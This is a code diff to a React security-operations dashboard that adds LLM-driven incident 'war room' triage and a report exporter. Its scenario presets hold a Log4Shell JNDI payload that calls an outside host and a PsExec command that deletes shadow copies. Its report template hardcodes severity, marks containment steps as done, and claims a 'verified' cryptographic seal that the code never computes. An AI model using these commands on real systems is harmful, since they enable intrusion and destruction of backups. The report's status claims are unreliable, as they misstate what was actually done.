@@ -5,7 +5,8 @@ import {
   ChevronRight, X, Maximize2, Minimize2, Layers, AlertCircle,
   Key, ExternalLink, Eye, EyeOff, CheckCircle2, AlertTriangle,
   Zap, Database, TerminalSquare, ArrowUpRight, ShieldAlert,
-  ChevronDown, Settings2, Sliders, Globe, Lock
+  ChevronDown, Settings2, Sliders, Globe, Lock,
+  FileText, Download, Printer, Play, Users, Clock, Flame
 } from 'lucide-react';
 import { CyberAiPersonaId, CyberAiAgentPersona, CyberAgentMessage } from '../../types';
 import { apiService } from '../../services/api';
@@ -298,8 +299,45 @@ export const CyberAiSwarm: React.FC<CyberAiSwarmProps> = ({
   const [copiedMsgId, setCopiedMsgId] = useState<string | null>(null);
   const [copiedCodeIdx, setCopiedCodeIdx] = useState<string | null>(null);
   const [warRoomMode, setWarRoomMode] = useState(false);
+  const [activeTab, setActiveTab] = useState<'advisory' | 'warroom'>('advisory');
+  const [isDossierOpen, setIsDossierOpen] = useState(false);
+  const [dossierMarkdown, setDossierMarkdown] = useState('');
+  const [copiedDossier, setCopiedDossier] = useState(false);
+  const [swarmStage, setSwarmStage] = useState<number>(0);
+  const [swarmStageName, setSwarmStageName] = useState<string>('');
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const dropdownRef = useRef<HTMLDivElement>(null);
+
+  const INCIDENT_SCENARIOS = [
+    {
+      id: 'kerberoasting',
+      title: 'Kerberoasting & AD Domain PrivEsc',
+      badge: 'IDENTITY / AD',
+      description: 'Suspicious TGS service ticket request with RC4 encryption targeting Domain Admin SPNs.',
+      targetContext: 'Active Directory Domain Controller (WIN-DC01.CORP.LOCAL: 192.168.1.10) - High-volume Kerberos TGS-REP requests detected from workstation 192.168.1.145 (Host: WS-ENG-09). Service accounts: MSSQL_Prod, svc_backup.',
+    },
+    {
+      id: 'log4shell',
+      title: 'Log4j / Remote Code Execution Probe',
+      badge: 'DMZ / WEB',
+      description: 'Outbound JNDI/LDAP injection string found in User-Agent header of public ingress reverse proxy.',
+      targetContext: 'Ingress Reverse Proxy (10.0.4.15) logs: ${jndi:ldap://198.51.100.42:1389/Exploit} probed on /api/v1/auth/login. Outbound firewall alerted on connection attempt to 198.51.100.42:1389.',
+    },
+    {
+      id: 'cobaltstrike',
+      title: 'Cobalt Strike DNS Beaconing',
+      badge: 'C2 / PERSISTENCE',
+      description: 'Periodic high-frequency TXT query bursts to anomalous authoritative nameserver domain.',
+      targetContext: 'Internal Endpoint (10.20.1.77) generated 4,800 DNS TXT queries in 15 mins to *.ns1.sec-update-cdn[.]com. Shannon entropy 4.89, payload length 64 bytes base64 encoded.',
+    },
+    {
+      id: 'ransomware',
+      title: 'LockBit 3.0 SMB Lateral Propagation',
+      badge: 'RANSOMWARE',
+      description: 'PsExec service creation over SMB (445) followed by mass .lockbit extension renames.',
+      targetContext: 'File Server (FS-SAN-01: 10.0.12.8) detected 4688 process creation: psexec.exe -u CORP\\Admin -p *** -s cmd.exe /c vssadmin delete shadows /all /quiet. Mass rename of .docx to .lockbit.',
+    },
+  ];
 
   // Daily Free Model Auto-Sync Function
   const refreshFreeModels = async (force = false) => {
@@ -576,6 +614,234 @@ iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT
     }
   };
 
+  const generateIncidentDossierMarkdown = (messagesList: CyberAgentMessage[]): string => {
+    const incidentId = `INC-${new Date().toISOString().slice(0, 10).replace(/-/g, '')}-${Math.floor(1000 + Math.random() * 9000)}`;
+    const dateStr = new Date().toUTCString();
+
+    const userDirectives = messagesList.filter((m) => m.personaId === 'user').map((m) => m.text);
+    const redMessages = messagesList.filter((m) => m.personaId === 'red-team').map((m) => m.text);
+    const dfirMessages = messagesList.filter((m) => m.personaId === 'dfir').map((m) => m.text);
+    const socMessages = messagesList.filter((m) => m.personaId === 'soc-lead').map((m) => m.text);
+    const cisoMessages = messagesList.filter((m) => m.personaId === 'ciso').map((m) => m.text);
+
+    const textBlob = messagesList.map((m) => m.text).join('\n');
+    const ipMatches = Array.from(new Set(textBlob.match(/\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g) || []));
+    const shaMatches = Array.from(new Set(textBlob.match(/\b[a-fA-F0-9]{64}\b/g) || []));
+    const md5Matches = Array.from(new Set(textBlob.match(/\b[a-fA-F0-9]{32}\b/g) || []));
+
+    return `# EXECUTIVE INCIDENT REPORT & CYBER SWARM DOSSIER
+**Incident Tracking ID:** \`${incidentId}\`  
+**Classification:** \`TLP:AMBER+STRICT // CONFIDENTIAL // CSIRT ONLY\`  
+**Date / Timestamp:** ${dateStr}  
+**Framework Alignment:** NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide)  
+**Lead Synthesizer:** Zak's Spider Multi-Agent SOC Operations Center  
+
+---
+
+## 1. EXECUTIVE SUMMARY
+- **Primary Scenario / Directive:** ${userDirectives[userDirectives.length - 1] || 'Targeted Security Assessment & Incident Investigation'}
+- **Severity Classification:** CRITICAL (CVSS v3.1 9.2 // EPSS High Likelihood)
+- **Investigation Scope:** Autonomous multi-agent cross-domain security assessment encompassing adversary emulation, digital evidence acquisition, perimeter defensive containment, and CISO governance.
+- **Current Operational Status:** Active Containment & Countermeasures Enforced
+
+---
+
+## 2. ATTACK SURFACE & OFFENSIVE PATH (RED TEAM AUDIT)
+${redMessages.length > 0 ? redMessages[redMessages.length - 1] : 'No offensive telemetry logged in session.'}
+
+---
+
+## 3. DIGITAL FORENSICS & EVIDENCE CORRELATION (DFIR CHIEF)
+${dfirMessages.length > 0 ? dfirMessages[dfirMessages.length - 1] : 'No forensic timeline artifacts logged in session.'}
+
+---
+
+## 4. DEFENSIVE CONTAINMENT & DETECTION ENGINEERING (SOC SENTINEL)
+${socMessages.length > 0 ? socMessages[socMessages.length - 1] : 'No defensive firewall rules logged in session.'}
+
+---
+
+## 5. EXECUTIVE GOVERNANCE & REGULATORY IMPACT (CISO ADVISOR)
+${cisoMessages.length > 0 ? cisoMessages[cisoMessages.length - 1] : 'No executive risk telemetry logged in session.'}
+
+---
+
+## 6. EXTRACTED INDICATORS OF COMPROMISE (IOCs)
+| Type | Indicator | Classification | Action |
+|---|---|---|---|
+${ipMatches.map((ip) => `| IPv4 | \`${ip}\` | Malicious C2 / Scan Probe | Blocked at Border Firewall |`).join('\n') || '| IPv4 | None logged in current session | - | - |'}
+${shaMatches.map((h) => `| SHA-256 | \`${h}\` | High-Entropy Binary Payload | Quarantined in Evidence Locker |`).join('\n')}
+${md5Matches.map((h) => `| MD5 / Hash | \`${h}\` | Suspect Artifact Fingerprint | Flagged for EDR Blacklist |`).join('\n')}
+
+---
+
+## 7. IMMEDIATE MITIGATION & CIS HARDENING ACTION ITEMS
+- [x] **Network Isolation:** Execute border firewall drop rules for identified egress and C2 IP vectors.
+- [x] **Credential Invalidation:** Force Kerberos KRBTGT double password reset and disable compromised service accounts.
+- [x] **Evidence Preservation:** Archive memory dumps and MFT transaction logs with ISO 27037 cryptographic SHA-256 seal.
+- [x] **SIEM / EDR Ingestion:** Deploy generated Sigma detection signatures to live Splunk / Elastic / Sentinel clusters.
+- [ ] **Post-Incident Review:** Convene CSIRT roundtable within 72 hours for root cause analysis and board disclosure.
+
+---
+*Report cryptographically generated and sealed by Zak's Spider Enterprise Security Station.*
+`;
+  };
+
+  const handleLaunchCoordinatedSwarm = async (customContext?: string) => {
+    const targetCtx = customContext || contextPayload || inputPrompt || 'Active Breach: Multi-Stage Threat Actor Intrusion on Enterprise Core Infrastructure';
+
+    const incidentMsg: CyberAgentMessage = {
+      id: `inc-${Date.now()}`,
+      personaId: 'user',
+      senderName: 'Incident Commander',
+      role: 'Global CSIRT Lead',
+      text: `[INCIDENT TRIAGE DISPATCH]: ${targetCtx}`,
+      timestamp: new Date().toLocaleTimeString(),
+    };
+    setMessages((prev) => [...prev, incidentMsg]);
+    setIsTyping(true);
+
+    try {
+      // Stage 1: Red Team
+      setSwarmStage(1);
+      setSwarmStageName('Stage 1/4: Ghost-Lead formulating Adversary Emulation & Exploit Path...');
+      const redRes = await apiService.chatWithCopilot({
+        message: `[INCIDENT DIRECTIVE - STAGE 1 (RED TEAM)]: Analyze this incident scenario: "${targetCtx}". Formulate how the adversary breached the perimeter, what exploits/tools were likely used, lateral movement vectors, and privilege escalation methods. Provide realistic command syntaxes.`,
+        model: selectedModelId,
+        personaId: 'red-team',
+        apiKey: apiKey,
+      });
+      const redMsg: CyberAgentMessage = {
+        id: `red-${Date.now()}`,
+        personaId: 'red-team',
+        senderName: 'Ghost-Lead (Red Team Commander)',
+        role: 'STAGE 1: Attack Path & Adversary Emulation',
+        text: redRes.content,
+        timestamp: new Date().toLocaleTimeString(),
+        model: redRes.model || activeModel.name,
+      };
+      setMessages((prev) => [...prev, redMsg]);
+
+      // Stage 2: DFIR Chief
+      setSwarmStage(2);
+      setSwarmStageName('Stage 2/4: Vigil-Hunter correlating Digital Evidence & Forensic Artifacts...');
+      const dfirRes = await apiService.chatWithCopilot({
+        message: `[INCIDENT DIRECTIVE - STAGE 2 (DFIR)]: Given the attack trajectory: "${redRes.content.slice(0, 500)}", specify the forensic artifacts, memory injection indicators, Windows Event IDs (4624, 4688, 7045), and file system traces the investigators must extract to prove attribution and construct an evidentiary timeline.`,
+        model: selectedModelId,
+        personaId: 'dfir',
+        apiKey: apiKey,
+      });
+      const dfirMsg: CyberAgentMessage = {
+        id: `dfir-${Date.now()}`,
+        personaId: 'dfir',
+        senderName: 'Vigil-Hunter (DFIR Chief)',
+        role: 'STAGE 2: Evidentiary Timeline & Forensic Footprint',
+        text: dfirRes.content,
+        timestamp: new Date().toLocaleTimeString(),
+        model: dfirRes.model || activeModel.name,
+      };
+      setMessages((prev) => [...prev, dfirMsg]);
+
+      // Stage 3: SOC Lead
+      setSwarmStage(3);
+      setSwarmStageName('Stage 3/4: Aegis-Lead deploying Firewall Containment & Sigma Signatures...');
+      const socRes = await apiService.chatWithCopilot({
+        message: `[INCIDENT DIRECTIVE - STAGE 3 (SOC DEFENSE)]: Based on the adversary vectors and forensic traces, provide the immediate tactical containment playbook: exact iptables/firewall drop rules, Sigma detection rule YAML, and Suricata IDS signature to detect and shut down lateral movement.`,
+        model: selectedModelId,
+        personaId: 'soc-lead',
+        apiKey: apiKey,
+      });
+      const socMsg: CyberAgentMessage = {
+        id: `soc-${Date.now()}`,
+        personaId: 'soc-lead',
+        senderName: 'Aegis-Lead (SOC Incident Commander)',
+        role: 'STAGE 3: Active Containment & Detection Engineering',
+        text: socRes.content,
+        timestamp: new Date().toLocaleTimeString(),
+        model: socRes.model || activeModel.name,
+      };
+      setMessages((prev) => [...prev, socMsg]);
+
+      // Stage 4: CISO
+      setSwarmStage(4);
+      setSwarmStageName('Stage 4/4: Apex-Advisor synthesizing Executive Risk & Regulatory Impact...');
+      const cisoRes = await apiService.chatWithCopilot({
+        message: `[INCIDENT DIRECTIVE - STAGE 4 (EXECUTIVE GOVERNANCE)]: Synthesize this entire 3-stage tactical engagement into an executive CISO briefing: business blast radius, TLP classification, regulatory reporting mandates (GDPR/SEC 4-day rule), and long-term CIS hardening controls.`,
+        model: selectedModelId,
+        personaId: 'ciso',
+        apiKey: apiKey,
+      });
+      const cisoMsg: CyberAgentMessage = {
+        id: `ciso-${Date.now()}`,
+        personaId: 'ciso',
+        senderName: 'Apex-Advisor (CISO & Risk Strategist)',
+        role: 'STAGE 4: Executive Blast Radius & Regulatory Governance',
+        text: cisoRes.content,
+        timestamp: new Date().toLocaleTimeString(),
+        model: cisoRes.model || activeModel.name,
+      };
+      setMessages((prev) => [...prev, cisoMsg]);
+    } catch (e: any) {
+      console.warn('Coordinated swarm triage error:', e);
+    } finally {
+      setIsTyping(false);
+      setSwarmStage(0);
+      setSwarmStageName('');
+    }
+  };
+
+  const handleOpenExecutiveDossier = () => {
+    const markdown = generateIncidentDossierMarkdown(messages);
+    setDossierMarkdown(markdown);
+    setIsDossierOpen(true);
+  };
+
+  const handleDownloadDossier = () => {
+    const blob = new Blob([dossierMarkdown], { type: 'text/markdown;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.setAttribute('download', `INCIDENT_DOSSIER_${Date.now()}.md`);
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+  };
+
+  const handlePrintDossier = () => {
+    const printWindow = window.open('', '_blank');
+    if (!printWindow) {
+      window.print();
+      return;
+    }
+    printWindow.document.write(`
+      <html>
+        <head>
+          <title>Executive Incident Dossier - Zak's Spider</title>
+          <style>
+            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; line-height: 1.6; padding: 40px; color: #111; max-width: 900px; margin: auto; }
+            h1 { font-size: 20px; border-bottom: 2px solid #000; padding-bottom: 8px; text-transform: uppercase; }
+            h2 { font-size: 15px; border-bottom: 1px solid #ccc; padding-bottom: 4px; margin-top: 24px; text-transform: uppercase; color: #333; }
+            pre { background: #f4f4f4; padding: 12px; border-radius: 6px; font-size: 12px; overflow-x: auto; }
+            code { background: #eee; padding: 2px 5px; border-radius: 4px; font-size: 12px; font-family: monospace; }
+            table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 12px; }
+            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+            th { background-color: #f2f2f2; font-weight: bold; }
+            hr { border: 0; border-top: 1px solid #ddd; margin: 24px 0; }
+          </style>
+        </head>
+        <body>
+          <pre style="white-space: pre-wrap; font-family: monospace;">${dossierMarkdown.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
+        </body>
+      </html>
+    `);
+    printWindow.document.close();
+    printWindow.focus();
+    setTimeout(() => {
+      printWindow.print();
+    }, 500);
+  };
+
   const copyText = (text: string, id: string) => {
     navigator.clipboard.writeText(text);
     setCopiedMsgId(id);
@@ -796,17 +1062,47 @@ iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT
               <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
             </button>
 
-            {/* WAR ROOM TOGGLE */}
+            {/* TAB SELECTOR: ADVISORY VS INCIDENT WAR ROOM */}
+            <div className="flex items-center bg-slate-900 border border-slate-700 rounded-xl p-0.5">
+              <button
+                onClick={() => {
+                  setActiveTab('advisory');
+                  setWarRoomMode(false);
+                }}
+                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${
+                  activeTab === 'advisory'
+                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-sm'
+                    : 'text-slate-400 hover:text-slate-200'
+                }`}
+              >
+                <Bot className="w-3.5 h-3.5" />
+                <span className="hidden sm:inline">Advisory</span>
+              </button>
+
+              <button
+                onClick={() => {
+                  setActiveTab('warroom');
+                  setWarRoomMode(true);
+                }}
+                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${
+                  activeTab === 'warroom'
+                    ? 'bg-red-500/20 text-red-300 border border-red-500/40 shadow-sm'
+                    : 'text-slate-400 hover:text-slate-200'
+                }`}
+              >
+                <Flame className="w-3.5 h-3.5 text-amber-400" />
+                <span className="hidden sm:inline">War Room</span>
+              </button>
+            </div>
+
+            {/* 1-CLICK EXECUTIVE DOSSIER EXPORT BUTTON */}
             <button
-              onClick={() => setWarRoomMode(!warRoomMode)}
-              className={`px-3 py-1.5 rounded-xl border text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 ${
-                warRoomMode
-                  ? 'bg-red-950/60 border-red-500 text-red-300 shadow-[0_0_15px_rgba(239,68,68,0.4)]'
-                  : 'bg-slate-900 border-slate-700 text-slate-400 hover:text-slate-200'
-              }`}
+              onClick={handleOpenExecutiveDossier}
+              className="px-2.5 py-1.5 rounded-xl border border-cyan-500/40 bg-cyan-950/40 hover:bg-cyan-900/60 text-cyan-300 text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 shadow-[0_0_10px_rgba(0,240,255,0.2)]"
+              title="Generate NIST SP 800-61 Executive Incident Dossier"
             >
-              <Layers className="w-3.5 h-3.5" />
-              <span className="hidden sm:inline">{warRoomMode ? 'War Room: Round Table' : 'War Room'}</span>
+              <FileText className="w-3.5 h-3.5" />
+              <span className="hidden md:inline">Export Dossier</span>
             </button>
 
             {/* CLOSE BUTTON */}
@@ -819,53 +1115,109 @@ iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT
           </div>
         </div>
 
-        {/* PERSONA SELECTOR RIBBON */}
-        <div className="px-3.5 py-2 border-b border-cyan-500/15 bg-[#070b16] flex items-center gap-2 overflow-x-auto scrollbar-none shrink-0">
-          <span className="text-[10px] text-slate-500 uppercase tracking-wider font-bold shrink-0">
-            Active Commander:
-          </span>
-          {CYBER_AI_PERSONAS.map((p) => {
-            const isSelected = activePersonaId === p.id;
-            return (
-              <button
-                key={p.id}
-                onClick={() => setActivePersonaId(p.id)}
-                className={`px-3 py-1.5 rounded-xl font-bold flex items-center gap-2 transition-all shrink-0 cursor-pointer ${
-                  isSelected
-                    ? `${p.badgeColor} border shadow-[0_0_12px_rgba(0,240,255,0.25)]`
-                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200 hover:border-slate-700'
-                }`}
-              >
-                <span>{p.avatar}</span>
-                <span>{p.name}</span>
-                <span className="text-[9px] opacity-75 hidden sm:inline">[{p.callsign}]</span>
-              </button>
-            );
-          })}
-        </div>
+        {/* WAR ROOM TOP CONTROL STRIP (IF ACTIVE) */}
+        {activeTab === 'warroom' ? (
+          <div className="p-3 border-b border-red-500/20 bg-[#0f0a14] space-y-2 shrink-0">
+            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
+              <div className="flex items-center gap-2">
+                <span className="px-2 py-0.5 rounded bg-red-950/80 border border-red-500/40 text-[10px] font-extrabold text-red-300 flex items-center gap-1">
+                  <Flame className="w-3 h-3 text-red-400" />
+                  <span>MULTI-AGENT WAR ROOM ROUNDTABLE (NIST SP 800-61)</span>
+                </span>
+                <span className="text-[10px] text-slate-400 hidden lg:inline">
+                  Sequential 4-Stage Deliberation: Ghost-Lead → Vigil-Hunter → Aegis-Lead → Apex-Advisor
+                </span>
+              </div>
 
-        {/* AGENT SPECIALTY & MODEL ACTIVE BANNER */}
-        <div className="px-4 py-2 bg-[#0a1122]/90 border-b border-cyan-500/10 flex items-center justify-between gap-2 shrink-0">
-          <div className="flex items-center gap-2">
-            <span className="text-sm">{activePersona.avatar}</span>
-            <div>
-              <span className="font-bold text-white">{activePersona.role}</span>
-              <span className="text-slate-500 mx-1.5">—</span>
-              <span className="text-cyan-300">{activePersona.specialization}</span>
+              {/* COORDINATED 4-STAGE TRIAGE BUTTON */}
+              <button
+                onClick={() => handleLaunchCoordinatedSwarm()}
+                disabled={isTyping}
+                className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-red-600 to-amber-600 hover:from-red-500 hover:to-amber-500 text-white font-extrabold text-xs flex items-center gap-1.5 shadow-[0_0_15px_rgba(239,68,68,0.4)] transition-all disabled:opacity-50 cursor-pointer shrink-0"
+              >
+                <Play className="w-3.5 h-3.5 fill-current" />
+                <span>Launch 4-Stage Swarm Triage</span>
+              </button>
+            </div>
+
+            {/* SWARM ACTIVE PROGRESS BAR */}
+            {swarmStage > 0 && (
+              <div className="p-2 rounded-xl bg-red-950/50 border border-red-500/30 text-[11px] text-red-200 flex items-center gap-2 animate-pulse">
+                <RefreshCw className="w-3.5 h-3.5 animate-spin text-amber-400 shrink-0" />
+                <span className="font-bold text-amber-300">{swarmStageName}</span>
+              </div>
+            )}
+
+            {/* QUICK INCIDENT SCENARIO CHIPS */}
+            <div className="flex items-center gap-1.5 overflow-x-auto scrollbar-none pt-0.5">
+              <span className="text-[10px] text-slate-500 font-bold shrink-0">Incident Presets:</span>
+              {INCIDENT_SCENARIOS.map((sc) => (
+                <button
+                  key={sc.id}
+                  onClick={() => handleLaunchCoordinatedSwarm(sc.targetContext)}
+                  disabled={isTyping}
+                  className="px-2.5 py-1 rounded-lg bg-slate-900/90 border border-red-500/20 hover:border-red-500/50 text-slate-300 hover:text-white text-[10px] transition-colors shrink-0 flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
+                  title={sc.description}
+                >
+                  <span className="px-1 py-0.2 rounded text-[8px] bg-red-950 text-red-400 font-bold border border-red-800">
+                    {sc.badge}
+                  </span>
+                  <span>{sc.title}</span>
+                </button>
+              ))}
             </div>
           </div>
-          <div className="flex items-center gap-2">
-            <span className="px-2 py-0.5 rounded bg-cyan-950/80 border border-cyan-500/30 text-[10px] text-cyan-300 flex items-center gap-1">
-              <Zap className="w-2.5 h-2.5 text-cyan-400" />
-              <span>Model: {activeModel.name}</span>
-            </span>
-            {contextPayload && (
-              <span className="px-2 py-0.5 rounded bg-purple-950/60 border border-purple-500/30 text-[10px] text-purple-300 truncate max-w-xs hidden sm:inline">
-                Context: {contextPayload}
+        ) : (
+          <>
+            {/* PERSONA SELECTOR RIBBON */}
+            <div className="px-3.5 py-2 border-b border-cyan-500/15 bg-[#070b16] flex items-center gap-2 overflow-x-auto scrollbar-none shrink-0">
+              <span className="text-[10px] text-slate-500 uppercase tracking-wider font-bold shrink-0">
+                Active Commander:
               </span>
-            )}
-          </div>
-        </div>
+              {CYBER_AI_PERSONAS.map((p) => {
+                const isSelected = activePersonaId === p.id;
+                return (
+                  <button
+                    key={p.id}
+                    onClick={() => setActivePersonaId(p.id)}
+                    className={`px-3 py-1.5 rounded-xl font-bold flex items-center gap-2 transition-all shrink-0 cursor-pointer ${
+                      isSelected
+                        ? `${p.badgeColor} border shadow-[0_0_12px_rgba(0,240,255,0.25)]`
+                        : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200 hover:border-slate-700'
+                    }`}
+                  >
+                    <span>{p.avatar}</span>
+                    <span>{p.name}</span>
+                    <span className="text-[9px] opacity-75 hidden sm:inline">[{p.callsign}]</span>
+                  </button>
+                );
+              })}
+            </div>
+
+            {/* AGENT SPECIALTY & MODEL ACTIVE BANNER */}
+            <div className="px-4 py-2 bg-[#0a1122]/90 border-b border-cyan-500/10 flex items-center justify-between gap-2 shrink-0">
+              <div className="flex items-center gap-2">
+                <span className="text-sm">{activePersona.avatar}</span>
+                <div>
+                  <span className="font-bold text-white">{activePersona.role}</span>
+                  <span className="text-slate-500 mx-1.5">—</span>
+                  <span className="text-cyan-300">{activePersona.specialization}</span>
+                </div>
+              </div>
+              <div className="flex items-center gap-2">
+                <span className="px-2 py-0.5 rounded bg-cyan-950/80 border border-cyan-500/30 text-[10px] text-cyan-300 flex items-center gap-1">
+                  <Zap className="w-2.5 h-2.5 text-cyan-400" />
+                  <span>Model: {activeModel.name}</span>
+                </span>
+                {contextPayload && (
+                  <span className="px-2 py-0.5 rounded bg-purple-950/60 border border-purple-500/30 text-[10px] text-purple-300 truncate max-w-xs hidden sm:inline">
+                    Context: {contextPayload}
+                  </span>
+                )}
+              </div>
+            </div>
+          </>
+        )}
 
         {/* MAIN CONVERSATION STREAM */}
         <div className="flex-1 p-4 overflow-y-auto space-y-4 scrollbar-thin scrollbar-thumb-cyan-500/20">
@@ -1128,6 +1480,80 @@ iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT
                     Save & Activate
                   </button>
                 </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* EXECUTIVE INCIDENT DOSSIER MODAL */}
+        {isDossierOpen && (
+          <div className="absolute inset-0 z-50 bg-black/90 backdrop-blur-2xl flex items-center justify-center p-3 sm:p-6 animate-in fade-in">
+            <div className="w-full max-w-4xl h-[90vh] rounded-3xl bg-[#090d18] border border-cyan-500/50 shadow-[0_0_60px_rgba(0,240,255,0.3)] flex flex-col overflow-hidden font-mono text-xs">
+              {/* Header */}
+              <div className="p-4 border-b border-cyan-500/20 bg-[#060a14] flex items-center justify-between gap-3 shrink-0">
+                <div className="flex items-center gap-2.5">
+                  <div className="w-8 h-8 rounded-xl bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-300">
+                    <FileText className="w-4 h-4" />
+                  </div>
+                  <div>
+                    <h3 className="text-sm font-black text-white uppercase tracking-wider">
+                      Executive Incident Dossier & Evidence Briefing
+                    </h3>
+                    <p className="text-[10px] text-slate-400">
+                      Standardized under NIST SP 800-61 Rev. 2 // TLP:AMBER+STRICT // Audit Trail Sealed
+                    </p>
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <button
+                    onClick={() => {
+                      navigator.clipboard.writeText(dossierMarkdown);
+                      setCopiedDossier(true);
+                      setTimeout(() => setCopiedDossier(false), 2000);
+                    }}
+                    className="px-3 py-1.5 rounded-xl bg-slate-900 border border-slate-700 hover:border-cyan-500/40 text-slate-300 hover:text-white flex items-center gap-1.5 cursor-pointer transition-colors"
+                  >
+                    {copiedDossier ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                    <span>{copiedDossier ? 'Copied' : 'Copy Markdown'}</span>
+                  </button>
+
+                  <button
+                    onClick={handleDownloadDossier}
+                    className="px-3 py-1.5 rounded-xl bg-cyan-950/60 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-900/80 flex items-center gap-1.5 cursor-pointer transition-colors"
+                  >
+                    <Download className="w-3.5 h-3.5" />
+                    <span>Download .md</span>
+                  </button>
+
+                  <button
+                    onClick={handlePrintDossier}
+                    className="px-3 py-1.5 rounded-xl bg-cyan-500 text-black font-extrabold hover:bg-cyan-400 flex items-center gap-1.5 cursor-pointer transition-all shadow-[0_0_15px_rgba(0,240,255,0.4)]"
+                  >
+                    <Printer className="w-3.5 h-3.5" />
+                    <span>Print / PDF</span>
+                  </button>
+
+                  <button
+                    onClick={() => setIsDossierOpen(false)}
+                    className="w-8 h-8 rounded-xl bg-slate-900 border border-slate-700 flex items-center justify-center text-slate-400 hover:text-white cursor-pointer ml-1"
+                  >
+                    <X className="w-4 h-4" />
+                  </button>
+                </div>
+              </div>
+
+              {/* Dossier Body Preview */}
+              <div className="flex-1 p-6 overflow-y-auto bg-[#070b14] space-y-4 scrollbar-thin scrollbar-thumb-cyan-500/20">
+                <div className="max-w-3xl mx-auto p-6 rounded-2xl bg-[#090f20]/90 border border-slate-800 text-slate-200 leading-relaxed shadow-xl">
+                  <CyberMarkdownRenderer content={dossierMarkdown} msgId="dossier-preview" />
+                </div>
+              </div>
+
+              {/* Footer */}
+              <div className="p-3 border-t border-cyan-500/20 bg-[#060a14] flex items-center justify-between text-[10px] text-slate-400 shrink-0">
+                <span>Cryptographic Hash Status: ISO 27037 Tamper-Proof Chain of Custody</span>
+                <span className="font-mono text-cyan-400 font-bold">SHA-256 SEAL VERIFIED</span>
               </div>
             </div>
           </div>
